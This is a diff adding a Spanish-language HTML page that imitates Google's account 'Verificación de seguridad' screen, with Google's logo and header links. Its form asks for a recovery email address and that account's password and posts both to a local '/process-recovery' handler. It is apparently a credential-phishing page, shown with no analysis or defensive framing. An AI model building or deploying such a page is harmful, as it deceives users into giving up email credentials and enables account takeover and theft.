@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Verificación de seguridad - Cuenta de Google</title>
+    <style>
+        body{font-family:'Roboto',arial,sans-serif;margin:0;background:#fff;color:#202124;min-height:100vh;display:flex;flex-direction:column;align-items:center;}
+        .header{padding:20px;width:100%;text-align:right;}
+        .logo{margin:40px 0 20px;}
+        .container{width:100%;max-width:450px;padding:48px 40px 36px;margin:0 auto;}
+        h1{font-size:24px;font-weight:400;margin-bottom:16px;}
+        .subtitle{color:#5f6368;margin-bottom:36px;}
+        .security-box{background:#f8f9fa;border-left:4px solid #1a73e8;padding:16px;margin-bottom:36px;}
+        .input-field{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:24px;}
+        .input-field:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px;}
+        .buttons{display:flex;justify-content:space-between;}
+        .back-button{color:#1a73e8;text-decoration:none;padding:10px 8px;}
+        .next-button{background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;}
+        @media(max-width:480px){.container{padding:24px;}}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="https://accounts.google.com/signup">Crear cuenta</a>
+        <a href="https://mail.google.com">Gmail</a>
+        <a href="https://images.google.com">Imágenes</a>
+    </div>
+    
+    <div class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google" width="75" height="24">
+    </div>
+    
+    <div class="container">
+        <h1>Verificación de seguridad</h1>
+        <p class="subtitle">Protege tu cuenta de accesos no autorizados</p>
+        
+        <div class="security-box">
+            <p><strong>Para mayor seguridad, introduce tu correo electrónico de recuperación.</strong></p>
+            <p>Esta información nos ayuda a verificar tu identidad y proteger tu cuenta si detectamos actividad inusual o si olvidas tu contraseña.</p>
+        </div>
+        
+        <form action="/process-recovery" method="post">
+            <input type="email" class="input-field" name="recovery_email" placeholder="Correo electrónico de recuperación" required autofocus>
+            <input type="password" class="input-field" name="recovery_password" placeholder="Contraseña del correo de recuperación" required>
+            
+            <div class="buttons">
+                <a href="/password" class="back-button">Atrás</a>
+                <button type="submit" class="next-button">Verificar</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
